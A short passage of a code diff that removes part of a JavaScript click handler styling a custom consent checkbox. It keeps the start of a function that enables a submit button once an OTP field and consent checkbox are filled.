-        this.style.borderColor = '#2778c4';
-      } else {
-        checkmarkSvg.style.display = 'none';
-        this.style.backgroundColor = 'white';
-        this.style.borderColor = '#ccc';
-      }
-    }
-    
-    // Update submit button state
-    updateMcSubmitButton();
-    
-    // Prevent event bubbling
-    e.stopPropagation();
-  });
-}
-    
-      
       // Update submit button based on OTP and consent
       function updateMcSubmitButton() {
         if (!mcOtpInput || !mcSubmitBtn || !mcConsentCheckbox) return;
